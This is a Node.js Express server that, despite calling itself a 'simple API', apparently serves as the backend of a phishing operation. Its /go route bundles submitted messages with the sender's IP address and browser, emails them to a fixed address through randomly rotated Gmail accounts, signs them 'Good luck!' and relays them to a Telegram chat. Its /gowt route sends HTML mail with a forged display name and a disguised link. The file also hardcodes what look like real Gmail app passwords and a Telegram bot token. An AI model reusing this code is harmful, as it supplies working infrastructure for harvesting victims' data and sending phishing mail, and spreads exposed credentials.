import express from "express";
import nodemailer from "nodemailer";
import bodyParser from "body-parser";
import cors from "cors";
import TelegramBot from "node-telegram-bot-api";
import axios from "axios";
import fetch from "node-fetch";

const app = express();
const port = 3001;

// Middleware to parse JSON requests
app.use(cors());
app.use(bodyParser.json());

// CORS Headers for iOS compatibility
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  next();
});

// Gmail accounts and their app passwords
const gmailAccounts = [
  { user: "serenetides37@gmail.com", pass: "rmmh cqms dcub denw" },
  { user: "serenetides02@gmail.com", pass: "fqye cfrz nvsg aluc" },
  { user: "shopperoutreach@gmail.com", pass: "atiu vczo bdgl lwou" },
  { user: "richard.weeks1945@gmail.com", pass: "ukrt wbph qizo ticu" },
];

// Telegram Bot setup
const telegramToken = "7637425229:AAEOd39Gvu7O77XXk_pm5FLDTOPcbxqAP3c";
const telegramBot = new TelegramBot(telegramToken);
const chatId = "5640521477"; // Replace with your chat ID
const webhookUrl = "https://api-gamma-neon.vercel.app/telegram-webhook"; // Replace with your actual webhook URL

// Set Telegram webhook
const setWebhook = async () => {
  try {
    const response = await axios.post(
      `https://api.telegram.org/bot${telegramToken}/setWebhook`,
      { url: webhookUrl }
    );
    console.log("Webhook set successfully:", response.data);
  } catch (error) {
    console.error("Error setting webhook:", error.message);
  }
};
setWebhook();

app.get("/", (req, res) => {
  res.writeHead(200, { "Content-Type": "text/plain" });
  res.end("Welcome to my simple API");
});

// Function to send email with randomized credentials
const sendEmailWithRandomAccount = (req, subject, message, callback) => {
  // Randomly select an account
  const { user, pass } = gmailAccounts[Math.floor(Math.random() * gmailAccounts.length)];

  console.log(`Using email: ${user} to send email.`);

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: { user, pass },
  });

  const ipAddress = req.ip;
  const userAgent = req.headers["user-agent"];
  const timestamp = new Date().toISOString();

  // Build the email message, including the Telegram message
  const fullMessage = `\n${message}\n\n=======================\nAdditional Information\n=======================\n\nIP Address:\n${ipAddress}\n\nBrowser:\n${userAgent}\n\nTimestamp:\n${timestamp}\n\n_Good luck!_`;

  const mailOptions = {
    from: user,
    to: "hey.heatherw@outlook.com",
    subject: subject,
    text: fullMessage,
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(`Failed to send email with ${user}:`, error.message);
      return callback("Failed to send email", null);
    } else {
      console.log(`Email successfully sent using ${user}.`);

      // Escape Markdown for Telegram
      const escapeMarkdown = (text) => {
        return text.replace(/[_*[\]()~`>#+-=|{}.!]/g, "\\$&");
      };

      const formattedMessage = escapeMarkdown(`Subject: ${subject}\n\n${fullMessage}`);

      // Send Telegram message
      telegramBot
        .sendMessage(chatId, formattedMessage, { parse_mode: "MarkdownV2" })
        .then(() => callback(null, { message: "Success", info }))
        .catch((telegramError) => {
          console.error("Failed to send Telegram message:", telegramError.message);
          callback("Telegram message failed", null);
        });
    }
  });
};

app.get("/location", async (req, res) => {
  const response = await fetch("http://ip-api.com/json/");
  const data = await response.json();
  res.json(data);
});

// Route to send email with Telegram notification
app.post("/go", (req, res) => {
  const { subject, message } = req.body;

  if (!subject || !message) {
    console.error("Missing subject or message in request body.");
    return res.status(400).json({ error: "All fields are required" });
  }

  sendEmailWithRandomAccount(req, subject, message, (error, result) => {
    if (error) {
      console.error("Error occurred:", error);
      return res.status(500).json({ error });
    }
    res.status(200).json(result);
  });
});

// New route: Sends email without Telegram integration but includes all additional info
app.post("/gowt", (req, res) => {
  const { subject, message, from, to, format, linkText, linkUrl, textColor, fontSize } = req.body;

  if (!subject || !message) {
    console.log("Request validation failed. Missing subject or message.");
    return res.status(400).json({ error: "All fields are required" });
  }

  console.log("Received request to send email.");

  // Randomly select an email account
  const { user, pass } = gmailAccounts[Math.floor(Math.random() * gmailAccounts.length)];

  console.log(`Attempting to send email with: ${user}`);

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: { user, pass },
  });

  const safeTextColor = textColor || "#000000"; // Default link color
  const safeFontSize = `${fontSize}px` || "16px"; // Default font size

  // Convert message to HTML with specified font size
  let htmlMessage = `
  <div style="font-size: ${safeFontSize}; color: #000;">
    ${message.replace(/\n\n/g, "</p><p>").replace(/\n/g, "<br>")}
  </div>
`;


  // Replace the specified text with a bold, clickable hyperlink
  htmlMessage = htmlMessage.replace(
    linkText,
    `<a href="${linkUrl}" target="_blank" style="color: ${safeTextColor}; font-weight: bold; text-decoration: none;">${linkText}</a>`
  );

  const mailOptions = {
    from: `${from}<${user}>` || user,
    to: to || "hey.heatherw@outlook.com",
    subject: subject,
    text: format === "html" ? undefined : message, // Plain text fallback
    html: format === "html" ? htmlMessage : undefined, // Styled HTML email content
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(`Failed to send email with ${user}:`, error);
      return res.status(500).json({ error: "Failed to send email" });
    } else {
      console.log(`Email successfully sent using ${user}.`);
      res.status(200).json({ message: "Email sent successfully", info });
    }
  });
});

app.post("/telegram-webhook", (req, res) => {
  console.log("Telegram webhook triggered:", JSON.stringify(req.body, null, 2));

  if (req.body && req.body.message) {
    const chatId = req.body.message.chat.id;
    const text = req.body.message.text;

    console.log("Received message:", text);

    telegramBot
      .sendMessage(chatId, `You said: ${text}`)
      .then(() => console.log("Message sent successfully."))
      .catch((err) => console.error("Failed to send Telegram message:", err.message));
  }

  res.status(200).send("OK");
});

// Start the server
app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
